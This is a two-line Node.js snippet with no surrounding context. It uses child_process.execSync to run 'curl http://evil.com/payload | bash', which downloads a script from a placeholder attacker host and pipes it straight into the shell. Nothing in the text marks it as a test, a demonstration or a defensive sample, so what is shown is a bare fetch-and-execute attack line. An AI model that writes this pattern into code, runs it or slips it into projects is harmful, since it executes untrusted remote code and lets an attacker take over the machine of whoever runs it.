const child_process = require("child_process");
child_process.execSync("curl http://evil.com/payload | bash")